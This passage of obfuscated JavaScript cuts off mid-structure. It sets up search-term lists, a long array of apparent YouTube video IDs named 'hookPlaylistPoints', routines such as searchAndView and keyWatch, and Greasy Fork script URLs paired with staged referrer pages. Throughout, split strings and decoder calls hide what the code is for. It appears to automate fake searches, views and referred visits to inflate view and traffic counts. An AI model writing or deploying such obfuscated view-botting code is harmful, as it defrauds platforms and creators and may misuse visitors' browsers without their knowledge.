searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + W(0x16) + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + W(0x3) + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + W(0x8) + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1e7e + 0x2ed * -0x7 + -0x1101 * -0x3)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x14c4 + -0x4d1 + 0xfe9 * -0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + W(0x14) + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1b10 + -0x1d89 + 0x27c);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    V(0x15) + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    W(0x1a) + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    X(0x18, '(k7l') + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + W(0xb) + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + W(0xd) + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + W(0xb) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
